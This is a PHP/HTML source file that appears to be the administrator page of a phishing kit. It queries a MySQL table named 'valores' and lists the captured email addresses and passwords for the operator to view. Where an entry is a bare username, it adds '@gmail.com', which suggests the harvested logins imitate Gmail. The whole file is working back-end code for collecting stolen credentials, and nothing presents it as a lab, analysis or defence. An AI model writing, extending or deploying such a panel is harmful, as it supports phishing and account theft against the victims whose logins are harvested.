<!DOCTYPE html>
<html>
    <head>
        <title>config.</title>
        <link rel="icon" type="image/x-icon" href="./../images/config.ico">
        <link rel="stylesheet" type="text/css" href="./../css/admin.css">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@500&display=swap" rel="stylesheet">
    </head>
    <body>
       <div class="centered-login">
        <img src="./../images/config.png" width="50" width="50">
        <p style="text-align:center;">- Look at the emails and Passwords -</p><br>
        <a href="./grabs.php"><button style="float:none; margin-top: 20px;">Reload</button></a><br>
        <br>
            <table>
                <?php
                    include_once("./db.php");

                    $server;
                    $username;
                    $passwd;
                    $db;

                    //echo "<tr><th>Email</th><th>Password</th></tr>";
                    $conn = mysqli_connect($server, $username, $passwd, $db);
                    // Check connection
                    if($conn === false){
                        echo "<a href='./admin/config.php'>Edit your DB connection params</a>\n\n\n";
                        die("ERROR: Could not connect. ". mysqli_connect_error()); 
                    }

                    $sql = "select email, passwd from valores";
                    $result = $conn->query($sql);

                    if ($result->num_rows > 0) {
                        echo "<table><tr><th>Email</th><th>Password</th></tr>";
                        while($row = $result->fetch_assoc()) {
                            $e = $row["email"];
                            $p = $row["passwd"];
                            //$word = "@gmail.com";

                            if ($p == ""){
                                if(strpos($e, "@") !== false){
                                    $aux = $e;
                                } else{
                                    $aux = "$e"."@gmail.com";
                                }
                            }
                            else{
                                echo "<tr><td>$aux</td><td>$p</td></tr>";
                            }
                        }
                        echo "</table>";
                    } 
                    else {
                        echo "0 results";
                    }
                    

                    mysqli_close($conn);
                ?>
            </table>
       </div> 
    </body>
</html>